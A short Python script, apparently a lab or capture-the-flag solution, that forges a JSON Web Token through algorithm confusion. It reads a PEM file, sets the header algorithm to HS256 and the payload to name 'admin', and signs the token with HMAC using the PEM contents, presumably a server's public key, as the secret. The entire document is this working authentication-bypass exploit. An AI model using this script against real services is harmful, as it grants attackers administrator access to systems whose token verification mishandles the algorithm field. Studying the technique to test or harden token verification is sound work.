import hmac
import hashlib
import base64

file =open("omg.pem")
key =file.read()

header ='{"alg":"HS256"}'
payload ='{"name":"admin"}'

encodedBytes =base64.urlsafe_b64encode(header.encode("utf-8"))
encodedHeader =str(encodedBytes, "utf-8").rstrip("=")

encodedPBytes =base64.urlsafe_b64encode(payload.encode("utf-8"))
encodedPPayload =str(encodedPBytes,"utf-8").rstrip("=")

token =(encodedHeader+ "." +encodedPPayload)
sig =base64.urlsafe_b64encode(hmac.new(bytes(key, "UTF-8"),token.encode('utf-8'),hashlib.sha256).digest()).decode('UTF-8').rstrip("=")
print(token+ "." +sig)
